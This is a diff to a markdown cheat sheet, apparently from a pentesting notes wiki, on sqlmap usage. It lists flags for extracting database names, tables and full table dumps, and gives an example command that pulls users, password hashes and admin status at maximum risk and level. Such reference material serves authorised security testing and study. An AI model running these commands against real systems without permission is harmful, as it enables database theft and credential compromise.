@@ -1,5 +1,15 @@
-The following is a cheatsheet taken partially from https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection. Please refer to this site for a more complete listing of sqlmap functionality. 
+SQLmap is an automated [[SQLi]] discovery and exploitation tool. Below are some basic usage options. 
 
+# Flags
+```shell
+--wizard # Add flags dynamically
+--dbs # Extract database names
+--tables # Extract table names from a database
+-D # select a database to query
+-T # Select a table to query
+--dump # Dump an entire database table
+```
+# Examples
 ```shell
 sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs # Basic SQLmap query
 
